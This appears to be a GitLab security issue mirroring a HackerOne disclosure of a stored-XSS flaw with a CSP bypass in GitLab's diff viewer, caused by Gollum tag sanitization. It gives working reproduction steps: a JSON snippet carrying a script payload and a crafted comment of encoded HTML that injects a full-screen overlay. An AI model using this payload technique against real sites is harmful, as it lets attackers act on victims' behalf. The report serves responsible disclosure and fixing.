

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored-XSS injected in diff viewer

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2441257](https://hackerone.com/reports/2441257)** by `yvvdwf` on 2024-03-29, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

Gitlab recently changed in [sanitization of Gollum links](https://gitlab.com/gitlab-org/gitlab/-/blob/5368a427e4ee6be16d8d38f62268efaf19ef0dea/lib/banzai/filter/gollum_tags_filter.rb#L67):

```
###  https://gitlab.com/gitlab-org/gitlab/-/blob/5368a427e4ee6be16d8d38f62268efaf19ef0dea/lib/banzai/filter/gollum_tags_filter.rb#L67
        doc.xpath('descendant-or-self::text()').each do |node|
          next if has_ancestor?(node, IGNORED_ANCESTOR_TAGS)
          next unless node.content =~ TAGS_PATTERN

          html = node.content.gsub(TAGS_PATTERN) do
            process_tag(Regexp.last_match(1)) || Regexp.last_match(0)
          end

          node.replace(html)
        end
```

Because `node.content` is used, it [will all **emit plaintext**](https://nokogiri.org/rdoc/Nokogiri/XML/Node.html#method-i-content).

It allows injecting arbitrary HTML elements.

##### Steps to reproduce

1. create a public snippet with a json file `alert.json` containing `{"html":"<script>alert(document.domain)</script>"}`, then open the raw version and make note of the path, for example: `https://gitlab.com/-/snippets/3683972/raw/main/alert.json`

[![snippet.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a591e7e8cbdcb1e735ee651114834116db8e83e6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34366231343735352d613831352d346538382d623836362d3939313435646434613832622f736e69707065742e706e67)

2. In an existing project, (or create a new project then make some commits), then goto `Code / Commits` and open a commit to view its diff, then enter the following comment (after replacing `data-diff-for-path` within the path noted above)

```
<i>&lt;div class=files &gt; &lt;div class=diff-file&gt; &lt;div class=diff-content&gt; &lt;div data-diff-for-path=/-/snippets/3683972/raw/main/alert.json class=js-file-title style=position:fixed;top:0px;right:0px;bottom:0px;left:0px;z-index:99999&gt; &lt;!-- [[ ]]</i>
```

[![comment.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/615495c691399ad21dbba6031e5d5d2f73270f00/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31333130393361332d633362372d343236662d383663352d6634366637623930343162652f636f6d6d656e742e706e67)

3. Refresh the page, then you might notice a topmost transparent layer. Click any where to trigger an alert.

##### Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

##### Output of checks

This bug happens on GitLab.com

#### Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [snippet.png](https://h1.sec.gitlab.net/a/46b14755-a815-4e88-b866-99145dd4a82b/snippet.png)
* [comment.png](https://h1.sec.gitlab.net/a/131093a3-c3b7-426f-86c5-f46f7b9041be/comment.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

